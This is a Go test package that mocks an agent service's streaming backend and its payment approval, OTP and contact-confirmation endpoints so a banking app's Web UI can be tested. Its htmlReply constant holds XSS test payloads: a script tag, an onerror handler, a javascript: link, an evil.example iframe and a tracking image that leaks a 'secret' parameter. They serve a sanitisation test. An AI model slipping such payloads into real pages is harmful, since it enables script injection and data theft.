// Package testbff is a scripted stand-in for the agent service's BFF: the AG-UI endpoint the Web UI talks to (POST /agent, answered
// as a stream of server-sent events), and the actions its cards call (approve, reject, the code, the contact). It says what its
// markers ask and nothing else, so that a test of the Web UI knows what the agent will say.
//
// The text of a message chooses the reply:
//
//	#error      the agent fails (RUN_ERROR)
//	#slow       a long reply of ticks, to stop it or to scroll while it streams
//	#tool       a tool call (lookup), then an answer with what it returned
//	#markdown   a reply with Markdown
//	#html       a reply with HTML that the page must not run
//	#pay        a transfer of S/ 20 to approve (ACTION_REQUEST)
//	#otp        a transfer of S/ 150 that asks for a code once approved
//	#contact    a contact to confirm (CONTACT_REQUEST)
//	anything    "You said: ..." word by word
package testbff

import (
	"context"
	"encoding/json/v2"
	"fmt"
	"io"
	"net/http"
	"slices"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

// Defaults of the pace.
const (
	DefaultWordDelay  = 10 * time.Millisecond
	DefaultSlowDelay  = 100 * time.Millisecond
	DefaultSlowChunks = 50
)

// OTPCode is the code the mock bank accepts.
const OTPCode = "123456"

// Probe counts what the agent saw: how many runs it was asked for, and how many the client left before they ended.
type Probe struct{ runs, cancelled atomic.Int64 }

// Runs is how many turns were asked.
func (p *Probe) Runs() int64 { return p.runs.Load() }

// Cancelled is how many turns the client left before the end.
func (p *Probe) Cancelled() int64 { return p.cancelled.Load() }

// Option changes how the handler paces its replies.
type Option func(*Handler)

// WithWordDelay sets the pause between the words of a reply.
func WithWordDelay(d time.Duration) Option { return func(h *Handler) { h.wordDelay = d } }

// WithSlow sets the pace and the length of the reply of #slow.
func WithSlow(delay time.Duration, chunks int) Option {
	return func(h *Handler) { h.slowDelay, h.slowChunks = delay, chunks }
}

// WithCutAfter makes the BFF end a reply that has streamed for d, without saying the run finished: the way a real BFF treats an answer
// that takes too long.
func WithCutAfter(d time.Duration) Option { return func(h *Handler) { h.cutAfter = d } }

// Handler is the scripted BFF.
type Handler struct {
	wordDelay, slowDelay time.Duration
	cutAfter             time.Duration
	slowChunks           int
	probe                Probe
	mux                  *http.ServeMux
}

// NewHandler returns the scripted BFF.
func NewHandler(opts ...Option) *Handler {
	h := &Handler{wordDelay: DefaultWordDelay, slowDelay: DefaultSlowDelay, slowChunks: DefaultSlowChunks}
	for _, opt := range opts {
		opt(h)
	}
	h.mux = http.NewServeMux()
	h.mux.HandleFunc("GET /health", func(w http.ResponseWriter, _ *http.Request) { _, _ = io.WriteString(w, "ok") })
	h.mux.HandleFunc("POST /agent", h.signedIn(h.agent))
	h.mux.HandleFunc("POST /bff/approvals/{id}/approve", h.signedIn(h.approve))
	h.mux.HandleFunc("POST /bff/approvals/{id}/reject", h.signedIn(h.reject))
	h.mux.HandleFunc("POST /bff/approvals/{id}/otp/confirm", h.signedIn(h.confirmCode))
	h.mux.HandleFunc("POST /bff/contacts/confirm", h.signedIn(h.confirmContact))
	return h
}

// Probe is what the agent saw.
func (h *Handler) Probe() *Probe { return &h.probe }

// ServeHTTP implements http.Handler.
func (h *Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) { h.mux.ServeHTTP(w, r) }

// signedIn asks for what the real BFF asks for: a bearer token and the account.
func (h *Handler) signedIn(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		token, bearer := strings.CutPrefix(r.Header.Get("Authorization"), "Bearer ")
		if !bearer || strings.TrimSpace(token) == "" || strings.TrimSpace(r.Header.Get("X-Yape-Account-Id")) == "" {
			http.Error(w, `{"statusCode":401,"message":"Unauthorized"}`, http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

// runInput is the part of RunAgentInput the scripted BFF reads.
type runInput struct {
	ThreadID string `json:"threadId"`
	RunID    string `json:"runId"`
	Messages []struct {
		Role    string `json:"role"`
		Content string `json:"content"`
	} `json:"messages"`
}

func (in runInput) lastUserText() string {
	for _, m := range slices.Backward(in.Messages) {
		if m.Role == "user" && strings.TrimSpace(m.Content) != "" {
			return m.Content
		}
	}
	return ""
}

// stream writes events as the BFF does: HTTP 201 and server-sent events, flushed one by one.
type stream struct {
	w     http.ResponseWriter
	flush func()
	ctx   context.Context
	// cutAt, when set, is when the reply is cut off.
	cutAt time.Time
}

func (s *stream) send(event map[string]any) bool {
	if s.ctx.Err() != nil || (!s.cutAt.IsZero() && time.Now().After(s.cutAt)) {
		return false
	}
	data, err := json.Marshal(event)
	if err != nil {
		return false
	}
	if _, err := fmt.Fprintf(s.w, "data: %s\n\n", data); err != nil {
		return false
	}
	s.flush()
	return true
}

func (h *Handler) agent(w http.ResponseWriter, r *http.Request) {
	var in runInput
	if err := json.UnmarshalRead(io.LimitReader(r.Body, 1<<20), &in); err != nil {
		http.Error(w, `{"statusCode":400,"message":"bad run input"}`, http.StatusBadRequest)
		return
	}
	h.probe.runs.Add(1)
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.WriteHeader(http.StatusCreated)
	rc := http.NewResponseController(w)
	s := &stream{w: w, ctx: r.Context(), flush: func() { _ = rc.Flush() }}
	if h.cutAfter > 0 {
		s.cutAt = time.Now().Add(h.cutAfter)
	}
	s.flush()

	if !h.play(s, in) && r.Context().Err() != nil {
		h.probe.cancelled.Add(1)
	}
}

// play says the reply; false when the client left before it ended.
func (h *Handler) play(s *stream, in runInput) bool {
	text := in.lastUserText()
	if !s.send(map[string]any{"type": "RUN_STARTED", "threadId": in.ThreadID, "runId": in.RunID}) {
		return false
	}
	switch {
	case strings.Contains(text, "#error"):
		return s.send(map[string]any{"type": "RUN_ERROR", "message": "scripted failure requested with #error"})
	case strings.Contains(text, "#slow"):
		return h.say(s, ticks(h.slowChunks), h.slowDelay) && h.finish(s, in)
	case strings.Contains(text, "#tool"):
		if !h.toolCall(s, "lookup", map[string]any{"query": text}, `{"result":"found"}`) {
			return false
		}
		return h.say(s, words(`The lookup returned: {"result":"found"}`), h.wordDelay) && h.finish(s, in)
	case strings.Contains(text, "#markdown"):
		return h.say(s, words(markdownReply), h.wordDelay) && h.finish(s, in)
	case strings.Contains(text, "#html"):
		return h.say(s, words(htmlReply), h.wordDelay) && h.finish(s, in)
	case strings.Contains(text, "#pay"):
		return h.card(s, in, "appr_pay", 20)
	case strings.Contains(text, "#otp"):
		return h.card(s, in, "appr_otp", 150)
	case strings.Contains(text, "#contact"):
		ok := s.send(map[string]any{"type": "CUSTOM", "name": "CONTACT_REQUEST", "value": map[string]any{
			"requestId": "req_1", "query": "Maria", "agentReference": "Maria",
			"message": "Confirma que sea la persona correcta antes de yapearle.", "confirmUrl": "/bff/contacts/confirm"}})
		return ok && h.say(s, words("Confirma que sea la persona correcta antes de yapearle."), h.wordDelay) && h.finish(s, in)
	}
	return h.say(s, words("You said: "+text), h.wordDelay) && h.finish(s, in)
}

// card asks the user to approve a transfer, as the real BFF does after the agent's tools have run.
func (h *Handler) card(s *stream, in runInput, approvalID string, amount float64) bool {
	if !h.toolCall(s, "request_transfer_approval", map[string]any{"amount": amount}, `{"state":"WAITING_APPROVAL"}`) {
		return false
	}
	ok := s.send(map[string]any{"type": "CUSTOM", "name": "ACTION_REQUEST", "value": map[string]any{
		"actionType": "approval", "approvalId": approvalID,
		"preview": map[string]any{"amount": amount, "currency": "PEN", "destinationName": "Rosa Diaz", "destinationPhone": "987654321", "message": "lunch"},
		"actions": []map[string]any{
			{"label": "Pay", "method": "POST", "url": "/bff/approvals/" + approvalID + "/approve", "style": "primary"},
			{"label": "Reject", "method": "POST", "url": "/bff/approvals/" + approvalID + "/reject", "style": "danger"},
		}}})
	return ok && h.say(s, words("Review your transfer."), h.wordDelay) && h.finish(s, in)
}

func (h *Handler) toolCall(s *stream, name string, args map[string]any, result string) bool {
	id := "call_" + name
	encoded, _ := json.Marshal(args)
	return s.send(map[string]any{"type": "TOOL_CALL_START", "toolCallId": id, "toolCallName": name}) &&
		s.send(map[string]any{"type": "TOOL_CALL_ARGS", "toolCallId": id, "delta": string(encoded)}) &&
		s.send(map[string]any{"type": "TOOL_CALL_END", "toolCallId": id}) &&
		s.send(map[string]any{"type": "TOOL_CALL_RESULT", "toolCallId": id, "content": result})
}

// say streams a message word by word.
func (h *Handler) say(s *stream, chunks []string, delay time.Duration) bool {
	if !s.send(map[string]any{"type": "TEXT_MESSAGE_START", "messageId": "msg_1", "role": "assistant"}) {
		return false
	}
	for i, chunk := range chunks {
		if i > 0 && !pause(s.ctx, delay) {
			return false
		}
		if !s.send(map[string]any{"type": "TEXT_MESSAGE_CONTENT", "messageId": "msg_1", "delta": chunk}) {
			return false
		}
	}
	return s.send(map[string]any{"type": "TEXT_MESSAGE_END", "messageId": "msg_1"})
}

func (h *Handler) finish(s *stream, in runInput) bool {
	return s.send(map[string]any{"type": "RUN_FINISHED", "threadId": in.ThreadID, "runId": in.RunID})
}

func pause(ctx context.Context, d time.Duration) bool {
	if d <= 0 {
		return ctx.Err() == nil
	}
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-t.C:
		return true
	case <-ctx.Done():
		return false
	}
}

func words(text string) []string {
	var chunks []string
	for piece := range strings.SplitAfterSeq(text, " ") {
		if piece != "" {
			chunks = append(chunks, piece)
		}
	}
	return chunks
}

func ticks(n int) []string {
	chunks := make([]string, max(n, 0)) // a negative length is a length of zero
	for i := range chunks {
		chunks[i] = "tick " + strconv.Itoa(i+1) + " "
	}
	return chunks
}

const markdownReply = "# Report\n\n" +
	"Here is a **bold** claim, some `inline code`, and a [link](https://example.com).\n\n" +
	"- first item\n- second item\n\n" +
	"| Name | Value |\n|------|-------|\n| alpha | 1 |\n\n" +
	"```go\nfmt.Println(\"hello\")\n```\n"

const htmlReply = "Here is some content.\n\n" +
	"<script>alert(1)</script>\n\n" +
	"<img src=\"x\" onerror=\"alert(1)\">\n\n" +
	"[click me](javascript:alert(1))\n\n" +
	"<iframe src=\"https://evil.example/frame\"></iframe>\n\n" +
	"![tracker](https://evil.example/pixel.png?leak=secret)\n\n" +
	"<style>body{display:none}</style>\n"

// --- the actions of the cards -----------------------------------------------------------------

type answer map[string]any

func writeJSON(w http.ResponseWriter, status int, body any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	data, _ := json.Marshal(body)
	_, _ = w.Write(data)
}

func refuse(w http.ResponseWriter, message string) {
	writeJSON(w, http.StatusBadRequest, answer{"statusCode": 400, "message": message, "error": "Bad Request"})
}

func (h *Handler) approve(w http.ResponseWriter, r *http.Request) {
	if r.PathValue("id") == "appr_otp" {
		writeJSON(w, http.StatusCreated, answer{"success": true, "approval_id": "appr_otp", "otp_required": true, "transfer_id": "trf_otp",
			"displayMessage": "Transfer approved. Enter the OTP to continue."})
		return
	}
	writeJSON(w, http.StatusCreated, answer{"success": true, "approval_id": r.PathValue("id"), "otp_required": false,
		"execution": answer{"provider_txn_id": "OP-TEST", "status": "SUCCESS"}, "displayMessage": "Transfer paid successfully. TxnID: OP-TEST"})
}

func (h *Handler) reject(w http.ResponseWriter, _ *http.Request) {
	writeJSON(w, http.StatusCreated, answer{"success": true, "status": "rejected", "displayMessage": "Transfer rejected successfully."})
}

func (h *Handler) confirmCode(w http.ResponseWriter, r *http.Request) {
	var in struct {
		TransferID string `json:"transfer_id"`
		OTP        string `json:"otp"`
	}
	if err := json.UnmarshalRead(io.LimitReader(r.Body, 1<<16), &in); err != nil || in.TransferID == "" || in.OTP == "" {
		refuse(w, "Missing transfer_id or otp")
		return
	}
	if in.OTP != OTPCode {
		refuse(w, "OTP verification failed")
		return
	}
	writeJSON(w, http.StatusCreated, answer{"success": true, "execution": answer{"provider_txn_id": "OP-TEST", "status": "SUCCESS"},
		"displayMessage": "Transfer paid successfully. TxnID: OP-TEST"})
}

func (h *Handler) confirmContact(w http.ResponseWriter, r *http.Request) {
	var in map[string]string
	if err := json.UnmarshalRead(io.LimitReader(r.Body, 1<<16), &in); err != nil {
		refuse(w, "bad body")
		return
	}
	var missing []string
	for _, field := range []string{"query", "phone", "name"} {
		if in[field] == "" {
			missing = append(missing, field)
		}
	}
	if len(missing) > 0 {
		refuse(w, "Missing required fields: "+strings.Join(missing, ", "))
		return
	}
	writeJSON(w, http.StatusCreated, answer{"status": "ok"})
}
